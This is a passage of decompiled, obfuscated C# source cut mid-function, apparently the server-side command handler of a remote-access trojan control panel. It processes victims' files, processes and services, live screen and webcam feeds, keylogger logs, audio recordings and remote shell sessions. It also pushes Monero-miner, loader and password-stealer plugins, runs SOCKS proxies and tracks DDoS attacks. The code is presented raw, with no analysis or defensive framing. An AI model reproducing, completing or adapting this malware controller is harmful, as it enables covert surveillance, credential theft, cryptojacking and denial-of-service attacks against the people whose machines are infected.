										cclient18.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__4)).Start();
								}
								else if (Operators.CompareString(left2, "files_zip_end", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient19 = cclient7;
										bool flag = true;
										cclient19.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									new Thread(new ThreadStart(class2.class152_0._Lambda$__5)).Start();
								}
								else if (Operators.CompareString(left2, "files_delete_start", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient20 = cclient7;
										bool flag = true;
										cclient20.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									string text = "0";
									fDB.method_4(ref value, ref text);
								}
								else if (Operators.CompareString(left2, "files_delete", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient21 = cclient7;
										bool flag = true;
										cclient21.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB2 = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									fDB2.method_4(ref value, ref class2.class152_0.string_0[1]);
								}
								else if (Operators.CompareString(left2, "files_delete_end", true) == 0)
								{
									if (cclient7.fDB == null)
									{
										CClient cclient22 = cclient7;
										bool flag = true;
										cclient22.SOCKET_DISCONNECT(ref flag);
										goto IL_23A3;
									}
									fDashboard fDB3 = cclient7.fDB;
									value = (long)Math.Round(Conversion.Val(class2.class152_0.string_0[0]));
									fDB3.method_4(ref value, ref class2.class152_0.string_0[1]);
								}
								else
								{
									if (Operators.CompareString(left2, "files_download", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient23 = cclient7;
											bool flag = true;
											cclient23.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										string text2 = string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											Strings.Replace(cclient7.sUser, "\\", "^", 1, -1, CompareMethod.Text),
											"\\",
											Strings.Replace(class2.class152_0.string_0[0], ":", string.Empty, 1, -1, CompareMethod.Text)
										});
										byte[] array3 = Convert.FromBase64String(class2.class152_0.string_0[1]);
										bool flag2 = true;
										byte[] byte_ = array3;
										string string_16 = text2;
										Class136.Class142 class3 = new Class136.Class142();
										class3.string_0 = string_16;
										class3.byte_0 = byte_;
										class3.bool_0 = false;
										try
										{
											if (flag2)
											{
												new Thread(new ThreadStart(class3._Lambda$__0)).Start();
											}
											else
											{
												Class136.smethod_15(ref class3.string_0, ref class3.byte_0, class3.bool_0);
											}
											goto IL_2352;
										}
										catch (Exception ex2)
										{
											goto IL_2352;
										}
									}
									if (Operators.CompareString(left2, "prc_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient24 = cclient7;
											bool flag = true;
											cclient24.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__6)).Start();
									}
									else if (Operators.CompareString(left2, "prc_kill", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient25 = cclient7;
											bool flag = true;
											cclient25.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__7)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient26 = cclient7;
											bool flag = true;
											cclient26.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__8)).Start();
									}
									else if (Operators.CompareString(left2, "srv_start", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient27 = cclient7;
											bool flag = true;
											cclient27.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__9)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_control", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient28 = cclient7;
											bool flag = true;
											cclient28.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__10)).Start();
										}
									}
									else if (Operators.CompareString(left2, "srv_uninstall", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient29 = cclient7;
											bool flag = true;
											cclient29.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__11)).Start();
										}
									}
									else if (Operators.CompareString(left2, "wnd_list", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient30 = cclient7;
											bool flag = true;
											cclient30.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										new Thread(new ThreadStart(class2.class152_0._Lambda$__12)).Start();
									}
									else if (Operators.CompareString(left2, "wnd_cmd", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient31 = cclient7;
											bool flag = true;
											cclient31.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__13)).Start();
										}
									}
									else if (Operators.CompareString(left2, "wnd_title", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient32 = cclient7;
											bool flag = true;
											cclient32.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (Operators.CompareString(class2.class152_0.string_0[0], "1", true) == 0)
										{
											new Thread(new ThreadStart(class2.class152_0._Lambda$__14)).Start();
										}
									}
									else if (Operators.CompareString(left2, "screenlive", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient33 = cclient7;
											bool flag = true;
											cclient33.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (num4 - 1L == unchecked((long)array[3].Length))
										{
											MemoryStream stream = new MemoryStream(class2.byte_0);
											cclient7.fDB.vmethod_24().Image = Image.FromStream(stream);
											cclient7.SCREEN_FPS_UPDATE((double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4));
										}
									}
									else if (Operators.CompareString(left2, "screenlive_secondary", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient34 = cclient7;
											bool flag = true;
											cclient34.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										if (num4 - 1L == unchecked((long)array[3].Length))
										{
											MemoryStream stream2 = new MemoryStream(class2.byte_0);
											cclient7.fDB.vmethod_248().Image = Image.FromStream(stream2);
										}
									}
									else if (Operators.CompareString(left2, "screenlive_stop", true) == 0)
									{
										if (cclient7.fDB == null)
										{
											CClient cclient35 = cclient7;
											bool flag = true;
											cclient35.SOCKET_DISCONNECT(ref flag);
											goto IL_23A3;
										}
										cclient7.fDB.method_6();
									}
									else if (Operators.CompareString(left2, "screen_preview_stop", true) != 0)
									{
										if (Operators.CompareString(left2, "monitors_refresh", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient36 = cclient7;
												bool flag = true;
												cclient36.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_7(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "webcamlive", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient37 = cclient7;
												bool flag = true;
												cclient37.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											if (num4 - 1L == unchecked((long)array[3].Length))
											{
												MemoryStream stream3 = new MemoryStream(class2.byte_0);
												cclient7.fDB.vmethod_264().Image = Image.FromStream(stream3);
												CClient cclient38 = cclient7;
												double num21 = (double)(Strings.Len(array[0]) + Strings.Len(array[1]) + Strings.Len(array[2]) + Strings.Len(array[3]) + 4);
												cclient38.WEBCAM_FPS_UPDATE(ref num21);
											}
										}
										else if (Operators.CompareString(left2, "webcam_start", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient39 = cclient7;
												flag = true;
												cclient39.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB4 = cclient7.fDB;
											flag = true;
											fDB4.method_9(ref flag);
										}
										else if (Operators.CompareString(left2, "webcam_stop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient40 = cclient7;
												flag = true;
												cclient40.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB5 = cclient7.fDB;
											flag = false;
											fDB5.method_9(ref flag);
										}
										else if (Operators.CompareString(left2, "webcam_devices", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient41 = cclient7;
												bool flag = true;
												cclient41.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_8(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient42 = cclient7;
												bool flag = true;
												cclient42.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_87(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_get", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient43 = cclient7;
												bool flag = true;
												cclient43.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_88(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgoff_del", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient44 = cclient7;
												bool flag = true;
												cclient44.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_95(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "klgonlinestart", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient45 = cclient7;
												flag = true;
												cclient45.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB6 = cclient7.fDB;
											flag = true;
											fDB6.method_101(ref flag);
										}
										else if (Operators.CompareString(left2, "klgonlinestop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient46 = cclient7;
												flag = true;
												cclient46.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB7 = cclient7.fDB;
											flag = false;
											fDB7.method_101(ref flag);
										}
										else if (Operators.CompareString(left2, "klgonlinedata", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient47 = cclient7;
												bool flag = true;
												cclient47.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_100(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "aud_rec", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient48 = cclient7;
												bool flag = true;
												cclient48.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											new Thread(new ThreadStart(class2._Lambda$__15)).Start();
										}
										else if (Operators.CompareString(left2, "aud_rec_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient49 = cclient7;
												bool flag = true;
												cclient49.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB8 = cclient7.fDB;
											string text = Encoding.UTF8.GetString(Convert.FromBase64String(class2.class152_0.string_0[0]));
											fDB8.method_96(ref text);
										}
										else if (Operators.CompareString(left2, "shell_start", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient50 = cclient7;
												flag = true;
												cclient50.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB9 = cclient7.fDB;
											flag = true;
											fDB9.method_120(ref flag);
										}
										else if (Operators.CompareString(left2, "shell_stop", true) == 0)
										{
											bool flag;
											if (cclient7.fDB == null)
											{
												CClient cclient51 = cclient7;
												flag = true;
												cclient51.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											fDashboard fDB10 = cclient7.fDB;
											flag = false;
											fDB10.method_120(ref flag);
										}
										else if (Operators.CompareString(left2, "shell_exec", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient52 = cclient7;
												bool flag = true;
												cclient52.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											cclient7.fDB.method_121(ref class2.class152_0.string_0[0]);
										}
										else if (Operators.CompareString(left2, "con_list", true) == 0)
										{
											if (cclient7.fDB == null)
											{
												CClient cclient53 = cclient7;
												bool flag = true;
												cclient53.SOCKET_DISCONNECT(ref flag);
												goto IL_23A3;
											}
											new Thread(new ThreadStart(class2.class152_0._Lambda$__16)).Start();
										}
										else if (Operators.CompareString(left2, "xmr_mine_start", true) == 0)
										{
											Class130.fMinerXMR_0.method_0(cclient7.sKey, cclient7.sUser);
										}
										else if (Operators.CompareString(left2, "xmr_mine_stop", true) == 0)
										{
											Class130.fMinerXMR_0.method_2(cclient7.sKey);
										}
										else
										{
											if (Operators.CompareString(left2, "xmr_mine_req", true) == 0)
											{
												if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
												{
													goto IL_2352;
												}
												string sKey = cclient7.sKey;
												string str = "xmr_mine_data|";
												string text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
												string str2 = Class136.smethod_29(ref text);
												string str3 = "|";
												text = Application.StartupPath + "\\data\\plugins\\xmr.plg";
												string string_17 = str + str2 + str3 + Class136.smethod_13(ref text);
												string string_18 = sKey;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex3)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr_mine_ready", true) == 0)
											{
												string sKey2 = cclient7.sKey;
												string string_17 = "xmr_mine_start|" + cclient7.MINER_LAST_SETTINGS;
												string string_18 = sKey2;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex4)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr64_mine_req", true) == 0)
											{
												if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
												{
													goto IL_2352;
												}
												string sKey3 = cclient7.sKey;
												string str4 = "xmr64_mine_data|";
												string text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
												string str5 = Class136.smethod_29(ref text);
												string str6 = "|";
												text = Application.StartupPath + "\\data\\plugins\\xmr64.plg";
												string string_17 = str4 + str5 + str6 + Class136.smethod_13(ref text);
												string string_18 = sKey3;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex5)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr64_mine_ready", true) == 0)
											{
												string sKey4 = cclient7.sKey;
												string string_17 = "xmr64_mine_start|" + cclient7.MINER_LAST_SETTINGS;
												string string_18 = sKey4;
												Class136.Class138 class4 = new Class136.Class138();
												class4.string_0 = string_18;
												class4.string_1 = string_17;
												class4.long_0 = 0L;
												try
												{
													if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
													{
														new Thread(new ThreadStart(class4._Lambda$__0)).Start();
													}
													goto IL_2352;
												}
												catch (Exception ex6)
												{
													goto IL_2352;
												}
											}
											if (Operators.CompareString(left2, "xmr_mine_stats", true) == 0)
											{
												if (Class130.fMinerXMR_0.Visible)
												{
													Class130.fMinerXMR_0.method_1(cclient7.sKey, class2.class152_0.string_0);
												}
											}
											else if (Operators.CompareString(left2, "xmr_mine_log", true) == 0)
											{
												Class130.fMinerXMRLogManager_0.method_0(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
											}
											else if (Operators.CompareString(left2, "socks4r_start", true) == 0)
											{
												Class130.fSocks4R_0.method_0(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
											}
											else if (Operators.CompareString(left2, "socks4r_stop", true) == 0)
											{
												Class130.fSocks4R_0.method_1(cclient7.sKey);
											}
											else if (Operators.CompareString(left2, "socks4r_stats", true) == 0)
											{
												Class130.fSocks4R_0.method_2(cclient7.sKey, class2.class152_0.string_0);
											}
											else if (Operators.CompareString(left2, "socks5_srv_start", true) == 0)
											{
												Class130.fSocks5_0.method_1(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
											}
											else if (Operators.CompareString(left2, "socks5_srv_stop", true) == 0)
											{
												Class130.fSocks5_0.method_2(cclient7.sKey);
											}
											else if (Operators.CompareString(left2, "socks5_srv_stats", true) == 0)
											{
												Class130.fSocks5_0.method_3(cclient7.sKey, class2.class152_0.string_0);
											}
											else
											{
												if (Operators.CompareString(left2, "plg_loader", true) == 0)
												{
													string sKey5 = cclient7.sKey;
													string[] array4 = new string[6];
													array4[0] = "plg_loader_data|";
													array4[1] = class2.class152_0.string_0[0];
													array4[2] = "|";
													int num22 = 3;
													string text = Application.StartupPath + "\\data\\plugins\\loader.plg";
													array4[num22] = Class136.smethod_29(ref text);
													array4[4] = "|";
													int num23 = 5;
													text = Application.StartupPath + "\\data\\plugins\\loader.plg";
													array4[num23] = Class136.smethod_13(ref text);
													string string_17 = string.Concat(array4);
													string string_18 = sKey5;
													Class136.Class138 class4 = new Class136.Class138();
													class4.string_0 = string_18;
													class4.string_1 = string_17;
													class4.long_0 = 0L;
													try
													{
														if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
														{
															new Thread(new ThreadStart(class4._Lambda$__0)).Start();
														}
														goto IL_2352;
													}
													catch (Exception ex7)
													{
														goto IL_2352;
													}
												}
												if (Operators.CompareString(left2, "crd_logins_req", true) == 0)
												{
													if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
													{
														goto IL_2352;
													}
													string sKey6 = cclient7.sKey;
													string str7 = "crd_logins_data|";
													string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
													string str8 = Class136.smethod_29(ref text);
													string str9 = "|";
													text = Application.StartupPath + "\\data\\plugins\\pws.plg";
													string string_17 = str7 + str8 + str9 + Class136.smethod_13(ref text);
													string string_18 = sKey6;
													Class136.Class138 class4 = new Class136.Class138();
													class4.string_0 = string_18;
													class4.string_1 = string_17;
													class4.long_0 = 0L;
													try
													{
														if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
														{
															new Thread(new ThreadStart(class4._Lambda$__0)).Start();
														}
														goto IL_2352;
													}
													catch (Exception ex8)
													{
														goto IL_2352;
													}
												}
												if (Operators.CompareString(left2, "crd_logins", true) == 0)
												{
													if (cclient7.fDB == null)
													{
														CClient cclient54 = cclient7;
														bool flag = true;
														cclient54.SOCKET_DISCONNECT(ref flag);
														goto IL_23A3;
													}
													cclient7.fDB.method_2(ref class2.class152_0.string_0[0]);
												}
												else
												{
													if (Operators.CompareString(left2, "crd_logins_report_req", true) == 0)
													{
														if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
														{
															goto IL_2352;
														}
														string sKey7 = cclient7.sKey;
														string str10 = "crd_logins_report_data|";
														string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
														string str11 = Class136.smethod_29(ref text);
														string str12 = "|";
														text = Application.StartupPath + "\\data\\plugins\\pws.plg";
														string string_17 = str10 + str11 + str12 + Class136.smethod_13(ref text);
														string string_18 = sKey7;
														Class136.Class138 class4 = new Class136.Class138();
														class4.string_0 = string_18;
														class4.string_1 = string_17;
														class4.long_0 = 0L;
														try
														{
															if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
															{
																new Thread(new ThreadStart(class4._Lambda$__0)).Start();
															}
															goto IL_2352;
														}
														catch (Exception ex9)
														{
															goto IL_2352;
														}
													}
													if (Operators.CompareString(left2, "crd_logins_report", true) == 0)
													{
														Class130.fCredentialsLogins_0.method_3(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_info", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient55 = cclient7;
															bool flag = true;
															cclient55.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_98(ref class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_error", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient56 = cclient7;
															bool flag = true;
															cclient56.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_99(ref class2.class152_0.string_0[0]);
													}
													else if (Operators.CompareString(left2, "remotebrowser_stop", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient57 = cclient7;
															bool flag = true;
															cclient57.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.method_97();
													}
													else if (Operators.CompareString(left2, "speedtest", true) == 0)
													{
														cclient7.sBandwidthDL = class2.class152_0.string_0[0];
													}
													else if (Operators.CompareString(left2, "speedtest_started", true) == 0)
													{
														cclient7.BANDWIDTHDL = "...";
													}
													else if (Operators.CompareString(left2, "soft_list", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient58 = cclient7;
															bool flag = true;
															cclient58.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__17)).Start();
													}
													else if (Operators.CompareString(left2, "thumb_data", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient59 = cclient7;
															bool flag = true;
															cclient59.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														cclient7.fDB.fThumb_0.method_2();
														MemoryStream stream4 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
														cclient7.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream4);
													}
													else if (Operators.CompareString(left2, "ddos_stats", true) == 0)
													{
														if (Class130.fDDOS_0.Visible)
														{
															Class130.fDDOS_0.method_1(cclient7.sKey, class2.class152_0.string_0);
														}
													}
													else if (Operators.CompareString(left2, "ddos_stop", true) == 0)
													{
														Class130.fDDOS_0.method_2(cclient7.sKey);
													}
													else if (Operators.CompareString(left2, "reg_hkeys_get", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient60 = cclient7;
															bool flag = true;
															cclient60.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__18)).Start();
													}
													else if (Operators.CompareString(left2, "reg_keys_get", true) == 0)
													{
														if (cclient7.fDB == null)
														{
															CClient cclient61 = cclient7;
															bool flag = true;
															cclient61.SOCKET_DISCONNECT(ref flag);
															goto IL_23A3;
														}
														new Thread(new ThreadStart(class2.class152_0._Lambda$__19)).Start();
													}
													else if (Operators.CompareString(left2, "scr_tb", true) == 0)
													{
														if (Class135.smethod_0().UIThumbnails)
														{
															MemoryStream stream5 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
															cclient7.ICO_STATUS = Image.FromStream(stream5);
															Class130.imageList_1.Images.Add(cclient7.sKey, cclient7.ICO_STATUS);
															Class130.fMain_0.method_5(true);
														}
													}
													else if (Operators.CompareString(left2, "dl_dir_obj_count", true) == 0)
													{
														Class130.concurrentDictionary_1.TryAdd(class2.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class2.class152_0.string_0[1])));
													}
													else if (cclient7.fDB == null)
													{
														CClient cclient62 = cclient7;
														bool flag = true;
														cclient62.SOCKET_DISCONNECT(ref flag);
														goto IL_23A3;
													}
												}
											}
										}
									}
								}
								IL_2352:
								fMain ff4 = cclient7.ff;
								CClient cclient63 = cclient7;
								ptr4 = ref cclient63.sKey;
								object value2 = cclient63.sKey;
								ff4.method_24(ref value2);
								ptr4 = Conversions.ToString(value2);
							}
							catch (Exception ex10)
							{
								Class130.concurrentDictionary_3[cclient7.sKey].sPacket.Clear();
							}
							IL_23A3:
							cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
							ptr2 = ref Class130.struct20_0.double_3;
						}
						Class130.struct20_0.double_3 = ptr2 + 1.0;
						CClient cclient64 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
						ptr2 = ref cclient64.stats_bytes_out;
						cclient64.stats_bytes_out = ptr2 + 1.0;
						CClient cclient65 = cclient2;
						bool flag3 = true;
						cclient65.SOCKET_DISCONNECT(ref flag3);
					}
					return;
				}
				if (cclient2.REMOTE_BROWSER_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient66 = Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY];
					ptr2 = ref cclient66.stats_bytes_in;
					cclient66.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient67 = cclient2;
							try
							{
								if (!cclient67.IS_SSL)
								{
									cclient67.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient67.REMOTE_BROWSER_USER_KEY].fDB.vmethod_464().Image = Image.FromStream(new MemoryStream(cclient67.mPacket.ToArray()));
								Class130.concurrentDictionary_3[cclient67.REMOTE_BROWSER_USER_KEY].REMOTE_BROWSER_FPS_UPDATE((double)cclient67.mPacket.Length);
								cclient67.mPacket.SetLength(0L);
							}
							catch (Exception ex11)
							{
								cclient67.mPacket.SetLength(0L);
							}
						}
						return;
					}
				}
				if (cclient2.SCREEN_PREVIEW_ACTIVE)
				{
					ref double ptr2 = ref Class130.struct20_0.double_2;
					Class130.struct20_0.double_2 = ptr2 + (double)num;
					ptr2 = ref Class130.struct20_0.double_4;
					Class130.struct20_0.double_4 = ptr2 + 1.0;
					CClient cclient68 = Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY];
					ptr2 = ref cclient68.stats_bytes_in;
					cclient68.stats_bytes_in = ptr2 + (double)num;
					cclient2.mPacket.Write(ptr, 0, num);
					checked
					{
						if (ptr.Length > 2 && (ptr[ptr.Length - 1] == 124 & ptr[ptr.Length - 2] == 124 & ptr[ptr.Length - 3] == 124))
						{
							cclient2.mPacket.SetLength(cclient2.mPacket.Length - 3L);
							CClient cclient69 = cclient2;
							try
							{
								if (!cclient69.IS_SSL)
								{
									cclient69.sock_async.socket_0.Send(Encoding.UTF8.GetBytes("1"));
								}
								Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_17();
								Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.vmethod_0().Image = Image.FromStream(new MemoryStream(cclient69.mPacket.ToArray()));
								if (Class135.smethod_0().PreviewDisplayFrameData)
								{
									CClient cclient70 = cclient69;
									ref long ptr5 = ref cclient70.lPreviewScreenFPS;
									cclient70.lPreviewScreenFPS = ptr5 + 1L;
									CClient cclient71 = cclient69;
									ref double ptr6 = ref cclient71.dPreviewScreenFPSAvgSize;
									unchecked
									{
										cclient71.dPreviewScreenFPSAvgSize = ptr6 + (double)cclient69.mPacket.Length;
										Class136.Struct27 @struct = default(Class136.Struct27);
										@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
										bool flag4 = false;
										if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
										{
											flag4 = true;
										}
										long num24;
										if (flag4)
										{
											num24 = Class136.GetTickCount64();
										}
										else
										{
											num24 = (long)Class136.GetTickCount();
										}
										if (checked(num24 - cclient69.lLastPreviewScreenFrame) >= 1000L)
										{
											Class130.concurrentDictionary_3[cclient69.SCREEN_PREVIEW_USER_KEY].fPr.method_18(cclient69.lPreviewScreenFPS, (double)cclient69.mPacket.Length, cclient69.dPreviewScreenFPSAvgSize);
											cclient69.lPreviewScreenFPS = 0L;
											cclient69.dPreviewScreenFPSAvgSize = 0.0;
											CClient cclient72 = cclient69;
											@struct = default(Class136.Struct27);
											@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
											flag4 = false;
											if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
											{
												flag4 = true;
											}
											if (flag4)
											{
												num24 = Class136.GetTickCount64();
											}
											else
											{
												num24 = (long)Class136.GetTickCount();
											}
											long lLastPreviewScreenFrame = num24;
